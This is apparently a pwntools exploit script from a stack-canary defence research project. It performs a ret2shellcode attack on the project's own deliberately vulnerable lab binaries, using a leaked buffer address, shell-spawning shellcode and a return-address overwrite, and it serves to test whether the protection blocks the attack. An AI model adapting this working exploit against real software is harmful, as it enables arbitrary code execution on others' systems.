# Copyright 2026 DynamicCanaryProject Authors
#
# 文件名: exp_shellcode.py
# 功能描述: Ret2Shellcode 攻击对比验证脚本。
#
#           针对 vuln_shellcode() 中的栈溢出漏洞发起 Ret2Shellcode 攻击：
#           程序主动打印 buf 的栈地址以规避 ASLR，脚本利用该地址将 Payload
#           中内嵌的机器码（shellcode）直接注入到栈缓冲区，并将返回地址
#           覆盖为 buf 的起始地址，实现任意代码执行。
#
#           关键技巧：
#             shellcode 开头插入 `sub rsp, 0x100`，将栈指针向下拉开安全距离，
#             防止后续函数调用时覆盖正在执行的 shellcode 本体。
#
#           预期结果：
#             - targets_baseline  : shellcode 成功执行，获得 Shell。
#             - targets_protected : 动态 Canary 在函数返回前检测到栈被覆盖，
#               触发拦截，shellcode 无法跳转执行。
#
# 用法: python3 exp_shellcode.py          # 测试基线版本
#        python3 exp_shellcode.py prot     # 测试动态 Canary 保护版本
#
# 依赖工具: pwntools (需要目标程序关闭 NX 保护：-z execstack)
# 作者: 陈文嘉
# 创建日期: 2026-04-15

from pwn import *
import sys
import time

context.arch = 'amd64'
target = '../output/targets_protected' if len(sys.argv) > 1 and sys.argv[1] == 'prot' else '../output/targets_baseline'
print(f"================ 测试目标: {target} ================")

# 启动靶场，传入参数 '2' 选择 vuln_shellcode
p = process([target, '2'])

# 提取程序主动泄漏的 buf 栈地址（改为按行读取并去除换行符，更精准！）
p.recvuntil(b"0x")
buf_addr_str = p.recvline().strip().decode('utf-8')
buf_addr = int(buf_addr_str, 16)
print(f"[+] 获取到精确的栈缓冲区物理地址: {hex(buf_addr)}")


# 【核心修复】：在 shellcode 开头插入 `sub rsp, 0x100`，把栈指针推到安全距离，防止自身被破坏！
shellcode = asm("sub rsp, 0x100") + asm(shellcraft.sh())

# 构造 Payload
payload = shellcode.ljust(72, b'A') + p64(buf_addr)

p.recvuntil(b": ")
p.send(payload)

time.sleep(0.5)

try:
    # 修复了 BytesWarning：去掉了 f，加上了 b
    p.sendline(b"echo '[X_X] Ret2Shellcode \xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81\xe7\xb3\xbb\xe7\xbb\x9f\xe5\xb7\xb2\xe8\xa2\xab\xe6\x8e\xa7\xe5\x88\xb6\xef\xbc\x81'")
    print(p.recvline(timeout=1).decode('utf-8', 'ignore'))
except:
    pass
print(p.recvall(timeout=1).decode('utf-8', 'ignore'))